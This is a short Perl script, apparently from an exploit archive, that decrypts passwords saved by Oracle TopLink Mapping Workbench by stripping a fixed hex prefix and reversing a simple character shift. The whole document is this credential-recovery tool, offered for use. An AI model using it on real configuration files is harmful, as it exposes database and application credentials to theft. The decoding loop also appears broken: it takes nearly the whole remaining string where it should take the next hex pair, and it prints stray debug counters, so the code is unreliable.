#!/usr/bin/perl
#Decrypt Oracle Toplink Mapping WorkBench passwords.
#Author: Martin

$string = "A7FCAA504BA7E4FC";

sub usage {
	print " Usage: $0 <password to decrypt>\n";
	}

if ($#ARGV != 0) {
	usage();
	}

else {  
	$encrypted = $ARGV[0];
	$encrypted =~ s/$string/ /;
	$chars = length($encrypted);
	$enc2 = substr($encrypted,0,2);	
	$encrypted = substr($encrypted,2,length($encrypted));
	$i = 0;
	while (($chars / 2) >= $i + 1) {
		print $i;
		$int = hex($enc2);
		if (($i%2) == 1) { $result .= chr($int - ( ($i + 1 )/3 ) - 112); }
		else {  $result .= chr($int - 4 + $i); }		
		$enc2 = substr($encrypted,0,length($encrypted) - 1);
        	$encrypted = substr($encrypted,2,length($encrypted));
		$i++;	
		}
	print "$result\n";	
	}

